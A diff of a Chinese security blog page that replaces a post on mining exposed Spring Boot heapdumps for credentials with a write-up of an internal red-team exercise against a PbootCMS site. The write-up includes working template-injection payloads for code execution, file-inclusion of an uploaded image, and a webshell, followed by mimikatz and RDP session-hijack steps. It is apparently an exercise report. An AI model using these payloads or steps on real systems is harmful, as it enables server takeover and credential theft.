@@ -19,9 +19,9 @@
 
   <!-- 页面元数据 -->
   
-  <title>spring boot之heapdump - cances</title>
+  <title>1月内部红蓝 - cances</title>
   
-    <meta name="keywords" content="web,java">
+    <meta name="keywords" content="web,内部红蓝,php">
   
 
   
@@ -447,7 +447,7 @@
     
     
       <h1 class="title">
-        spring boot之heapdump
+        1月内部红蓝
       </h1>
       <div class='new-meta-box'>
         
@@ -456,7 +456,7 @@
   <div class='new-meta-item category'>
     <a class='notlink'>
       <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
-      <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+      <a class="category-link" href="/categories/%E5%86%85%E9%83%A8%E7%BA%A2%E8%93%9D%E8%AE%B0%E5%BD%95/">内部红蓝记录</a>
     </a>
   </div>
 
@@ -478,7 +478,7 @@
   <div class="new-meta-item browse leancloud">
     <a class='notlink'>
       
-      <div id="lc-pv" data-title="spring boot之heapdump" data-path="/2021/01/26/">
+      <div id="lc-pv" data-title="1月内部红蓝" data-path="/2021/01/26/">
         <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
         <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
         次浏览
@@ -495,38 +495,45 @@
 
 
   
-  <h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>首先要获取heapdump。从<a target="_blank" rel="noopener" href="http://www.xx.com/heapdump%E8%8E%B7%E5%8F%96%E8%B0%83%E7%94%A8%E6%A0%88%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%98%AF">http://www.xx.com/heapdump获取调用栈相关信息，如果是</a> sping boot 2.x 的话路径就是：<a target="_blank" rel="noopener" href="http://www.xx.com/actuator/heapdump">http://www.xx.com/actuator/heapdump</a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/3414c2aff49022bc453c856806036e905f16a3.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/3414c2aff49022bc453c856806036e905f16a3.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled.png"></p>
-<p>然后下载 <a target="_blank" rel="noopener" href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文或者其他敏感信息。</p>
-<p>使用 Eclipse Memory Analyzer 是无法直接打开下载的 heapdump 文件的，需要改后缀为 .hprof</p>
-<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/ea2db7ddd75be6363d736f3c725af63f773e9d.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/ea2db7ddd75be6363d736f3c725af63f773e9d.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%201.png"></p>
-<p>更改后缀之后就可以成功打开了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/974c946af1aefc0a16149517d6aadd78fbf8f4.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/974c946af1aefc0a16149517d6aadd78fbf8f4.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%202.png"></p>
-<p>还有个注意事项是，内存如果解压出来，比如当前我解压出来 1.46G ，那么在 MemoryAnalyzer.ini 这个文件当中需要将内存设置为大于这个大小，我设置为 2G ，否则会报错。我的文件没那么大，所以就不需要修改了。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/149f76b6a1864bdc9f53c1d1bb03f0dc120af1.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/149f76b6a1864bdc9f53c1d1bb03f0dc120af1.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%203.png"></p>
-<h2 id="搜索敏感信息"><a href="#搜索敏感信息" class="headerlink" title="搜索敏感信息"></a>搜索敏感信息</h2><p>点击 OQL 标签，在查询框中输入语句进行查询</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> org.springframework.web.context.support.StandardServletEnvironment</span><br></pre></td></tr></table></figure>
-<p>然后点击红色感叹号执行查询。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/d21a3f520a6a56dd62f8a5ad159c9544a0912a.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/d21a3f520a6a56dd62f8a5ad159c9544a0912a.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%204.png"></p>
-<p>也可以定位关键词进行查询</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> java.util.Hashtable$Entry x <span class="keyword">WHERE</span> (toString(x.key).contains(<span class="string">&quot;user&quot;</span>)) <span class="keyword">or</span> (toString(x.key).contains(<span class="string">&quot;pass&quot;</span>))</span><br></pre></td></tr></table></figure>
-<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/5df2b9f8fa8e84a9dbbef6363475626fa12702.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/5df2b9f8fa8e84a9dbbef6363475626fa12702.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%205.png"></p>
-<p>拓展一下也可以直接搜accessKey</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> java.util.Hashtable$Entry x <span class="keyword">WHERE</span> (toString(x.key).contains(<span class="string">&quot;accessKey&quot;</span>))</span><br></pre></td></tr></table></figure>
-<p>我这个里面没有。。。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/3c48cca592674668d417121f85ed978c17ec01.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/3c48cca592674668d417121f85ed978c17ec01.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%206.png"></p>
-<p>借一张xray社区的图</p>
-<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/b2ea9a70d7eb8276300ec6594f9515307248e9.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/b2ea9a70d7eb8276300ec6594f9515307248e9.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%207.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/14093a7079ba0d34b2015fc5a20a6990a1df5c.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/14093a7079ba0d34b2015fc5a20a6990a1df5c.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%208.png"></p>
-<p>wx，app等等。。。都可以搜</p>
-<p>还有一种查看方式就是通过 Top Consumers  </p>
-<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/2148221dc5bcb4b4fe83851eb932bd7e3b2be3.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/2148221dc5bcb4b4fe83851eb932bd7e3b2be3.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%209.png"></p>
-<p>然后根据包的结构去查看自己感兴趣的东西，比如我此处的 druid</p>
-<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c9f7d2b714d1a6e5ccebd992400dee56251a06.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c9f7d2b714d1a6e5ccebd992400dee56251a06.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%2010.png"></p>
-<p>比如此处就能看到一台sqlserver的连接信息（ip，账号，密码）。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/5e9ef7ff0b7f54fbe10395a61fceedc7d1c339.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/5e9ef7ff0b7f54fbe10395a61fceedc7d1c339.png" srcset="data:image/png;base64,666" alt="spring%20boot%E4%B9%8Bheapdump%20d36d51fecf994d9193156304740f3cad/Untitled%2011.png"></p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/YirHAXg3VZXA3Znj4L6xSw">记一次信息泄漏到RCE</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yrwan95/article/details/82826066">Eclipse Memory Analyzer —— MAT查找内存泄漏工具</a></p>
+  <h1 id="1月内部红蓝"><a href="#1月内部红蓝" class="headerlink" title="1月内部红蓝"></a>1月内部红蓝</h1><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>看到网站直接试admin就进后台了，然后上github找到了PbootCMS项目，尝试默认口令，admin:123456就进后台了。考点肯定不是这个。。。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c5ef2eb085131d6d7ca13c64f87e6663824.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c5ef2eb085131d6d7ca13c64f87e6663824.png" srcset="data:image/png;base64,666" alt="Untitled.png"></p>
+<p>后来群里有人说有网站备份文件，访问wwwroot.zip下载到网站备份文件。浏览了一下发现有些缓存文件，访问后得到绝对路径。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/72ec03627c67297aad6348cf47499298083.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/72ec03627c67297aad6348cf47499298083.png" srcset="data:image/png;base64,666" alt="Untitled%201.png"></p>
+<p>其实这次的靶场应该是某次CTF的原题，但环境是一开始是php5.4，尝试了一些方法没成功。好在后来环境还是换成php7所以成功shell了。</p>
+<p>代码审计部分，某篇先知文章已经写过了，这里简单写写。首先定位eval函数，全站就一处，但严防死守。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/647944a11e347344a0c67fab2ad78ab2210.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/647944a11e347344a0c67fab2ad78ab2210.png" srcset="data:image/png;base64,666" alt="Untitled%202.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$white_fun</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;date&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;in_array&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;explode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;implode&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 还原可能包含的保留内容，避免判断失效</span></span><br><span class="line"><span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>] = <span class="keyword">$this</span>-&gt;restorePreLabel(<span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带有函数的条件语句进行安全校验</span></span><br><span class="line"><span class="keyword">if</span> (preg_match_all(<span class="string">&#x27;/([\w]+)([\x00-\x1F\x7F\/\*\&lt;\&gt;\%\w\s\\\\]+)?\(/i&#x27;</span>, <span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>], <span class="variable">$matches2</span>)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$matches2</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (function_exists(<span class="variable">$value</span>) &amp;&amp; ! in_array(<span class="variable">$value</span>, <span class="variable">$white_fun</span>)) &#123;</span><br><span class="line">            <span class="variable">$danger</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 过滤特殊字符串</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(file_get_contents)|(fwrite)|(phpinfo)|(base64)|(`)|(shell_exec)|(eval)|(assert)|(system)|(exec)|(passthru)|(pcntl_exec)|(popen)|(proc_open)|(print_r)|(print)|(urldecode)|(chr)|(include)|(request)|(__FILE__)|(__DIR__)|(copy)|(call_user_)|(preg_replace)|(array_map)|(array_reverse)|(array_filter)|(getallheaders)|(get_headers)|(decode_string)|(htmlspecialchars)|(session_id)/i&#x27;</span>, <span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>])) &#123;</span><br><span class="line">    <span class="variable">$danger</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果有危险函数，则不解析该IF</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$danger</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;if(&#x27;</span> . <span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>] . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>首先设置了可以使用函数的白名单，假如使用除白名单以外的函数回被识别为danger。这里限制了调用了函数，在KCon2019大会上的提出的新特性也过滤掉了，导致调用函数基本不成可能。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/a25666956f40b67561e58bbb8904551a181.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/a25666956f40b67561e58bbb8904551a181.png" srcset="data:image/png;base64,666" alt="Untitled%203.png"></p>
+<p>第二个正则是限制了一些黑名单关键字，其中限制了include，但没有限制require，第一天看代码时眼花，把request看成require了。。。</p>
+<p>后台有很多上传点，但都是白名单，绕不过。所以就就可以和这里结合（文件包含+文件上传=shell）。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;pboot:<span class="keyword">if</span>(<span class="number">1</span>)<span class="keyword">require</span> <span class="string">&quot;static/upload/image/xxxxxxx/1611416284187820.jpg&quot;</span>;<span class="comment">//)&#125;sdfsd&#123;/pboot:if&#125;</span></span><br></pre></td></tr></table></figure>
+<p>该功能最简单触发的地方就是标题样式这里。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/cd015d00625c5b787be9eee3ceb08a0e179.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/cd015d00625c5b787be9eee3ceb08a0e179.png" srcset="data:image/png;base64,666" alt="Untitled%204.png"></p>
+<p>填入之后发现并没有触发。通过调试发现前面还有一些别的处理，导致失败。一个就是pboot:if变成了pboot@if导致标签无法正常触发。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$varname</span>, <span class="variable">$condition</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> (is_string(<span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="variable">$data</span> = trim(<span class="variable">$data</span>); <span class="comment">// 去空格</span></span><br><span class="line">        <span class="variable">$data</span> = preg_replace_r(<span class="string">&#x27;/(x3c)|(x3e)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>); <span class="comment">// 去十六进制括号</span></span><br><span class="line">        <span class="variable">$data</span> = preg_replace_r(<span class="string">&#x27;/pboot:if/i&#x27;</span>, <span class="string">&#x27;pboot@if&#x27;</span>, <span class="variable">$data</span>); <span class="comment">// 过滤插入cms条件语句</span></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但后来找到了先知那篇文章，发现大佬利用密码不允许显示的空子的地方bypass了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/859ab9718d1a2a92ef2c78b4b5548129308.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/859ab9718d1a2a92ef2c78b4b5548129308.png" srcset="data:image/png;base64,666" alt="Untitled%205.png"></p>
+<p>但还有一个问题没有解决。payload中的 “ 被html实体编码了。</p>
+<p>但是因为php5和函数被过滤的原因，暂时没想到解决的办法。。。好在，最后php环境切换了，所以，直接上paylaod。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;pboot&#123;user:password&#125;:<span class="keyword">if</span>(<span class="number">1</span>)(sys.tem)(((ne.xt)((getallheade.rs)())));;<span class="comment">//)&#125;sdfsd&#123;/pboot:if&#125;</span></span><br></pre></td></tr></table></figure>
+<p>上面那些都是在本地环境测试的。为了可以直接使用我准备好的exp我需要把url地址模式调为兼容模式。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/d553767ed7e653ad30821fd61eafd39c260.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/d553767ed7e653ad30821fd61eafd39c260.png" srcset="data:image/png;base64,666" alt="Untitled%206.png"></p>
+<p>然后在标题样式处填入paylaod</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/24430512f51058884e9ea2bae659d4fc550.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/24430512f51058884e9ea2bae659d4fc550.png" srcset="data:image/png;base64,666" alt="Untitled%207.png"></p>
+<p>然后打paylaod，Cookie里填要执行的命令。发现是system权限，而且 system 没有被disable。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/faf2533bc20c99ab9e99aee44fd96931273.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/faf2533bc20c99ab9e99aee44fd96931273.png" srcset="data:image/png;base64,666" alt="Untitled%208.png"></p>
+<p>为了更方便的操作，把之前传好的jpg copy成php放在网站根目录。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/8098baaace14736d6fb6b02e1f65e175780.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/8098baaace14736d6fb6b02e1f65e175780.png" srcset="data:image/png;base64,666" alt="image-20210131002419240"></p>
+<p>然后就shell了，拿到服务器权限。信息收集看了一下，好像真的只是一台vps，没有内网，估计是到此为止了，上机器去看看。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/65ef4f973a6a6c48c289345ac8e48730240.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/65ef4f973a6a6c48c289345ac8e48730240.png" srcset="data:image/png;base64,666" alt="Untitled%2010.png"></p>
+<p>mimikatz抓密码，结果解不出来。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/5795a63049ee13cf2d7a1f4cf9235dcf268.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/5795a63049ee13cf2d7a1f4cf9235dcf268.png" srcset="data:image/png;base64,666" alt="Untitled%2011.png"></p>
+<p>既然服务器是server2012那就试试PTH-RDP。结果失败。。。应该是组策略的原因。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/34995fab3fe26db3f35ca2a057fc88f0796.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/34995fab3fe26db3f35ca2a057fc88f0796.png" srcset="data:image/png;base64,666" alt="Untitled%2012.png"></p>
+<p>新建用户，然后利用incognito提升到system权限，然后 tscon 2 切过去。截图，结束战斗。。。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/6e9f184ae23d96937f2c241116eb793b655.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/6e9f184ae23d96937f2c241116eb793b655.png" srcset="data:image/png;base64,666" alt="Untitled%2013.png"></p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8321">PbootCMS V3.0.1任意代码执行</a></p>
 
   
   
@@ -563,7 +570,7 @@
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/java/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>java</p></a></div>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%86%85%E9%83%A8%E7%BA%A2%E8%93%9D/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>内部红蓝</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/php/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>php</p></a></div>
 
 
         
@@ -576,7 +583,7 @@
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://canc3s.github.io/2021/01/26/&title=spring boot之heapdump - cances&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://canc3s.github.io/2021/01/26/&title=1月内部红蓝 - cances&summary="
           
           >
           
@@ -588,7 +595,7 @@
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://canc3s.github.io/2021/01/26/&title=spring boot之heapdump - cances&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://canc3s.github.io/2021/01/26/&title=1月内部红蓝 - cances&summary="
           
           >
           
@@ -600,7 +607,7 @@
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=https://canc3s.github.io/2021/01/26/&title=spring boot之heapdump - cances&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://canc3s.github.io/2021/01/26/&title=1月内部红蓝 - cances&summary="
           
           >
           
@@ -612,7 +619,7 @@
       
         <a class="-mob-share-telegram" title="" rel="external nofollow noopener noreferrer noopener"
           
-            target="_blank" href="https://t.me/share/url?url=https://canc3s.github.io/2021/01/26/&text=spring boot之heapdump - cances"
+            target="_blank" href="https://t.me/share/url?url=https://canc3s.github.io/2021/01/26/&text=1月内部红蓝 - cances"
           
           >
           
@@ -638,11 +645,16 @@
   
     <div class="prev-next">
       
-        <a class='prev' href='/2021/01/26/'>
-          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>1月内部红蓝</p>
-          <p class='content'>1月内部红蓝代码审计看到网站直接试admin就进后台了，然后上github找到了PbootCMS项目，尝试默认口令，admin:123456就进后台了。考点肯定不是这个。。。
+        <a class='prev' href='/2021/01/30/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>tsh</p>
+          <p class='content'>介绍下载地址：https://github.com/orangetw/tsh
+功能：
 
-后来群里有人说有...</p>
+通信加密
+支持上传、下载、直接反弹shell
+
+tsh.h文件，用来配置生成的tsh
+1234567891...</p>
         </a>
       
       
@@ -691,7 +703,7 @@
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF"><span class="toc-text">搜索敏感信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%EF%BC%9A"><span class="toc-text">参考：</span></a></li></ol>
     </div>
   </section>
 
@@ -711,7 +723,7 @@
 <script>
   window.pdata={}
   pdata.ispage=true;
-  pdata.postTitle="spring boot之heapdump";
+  pdata.postTitle="1月内部红蓝";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
 
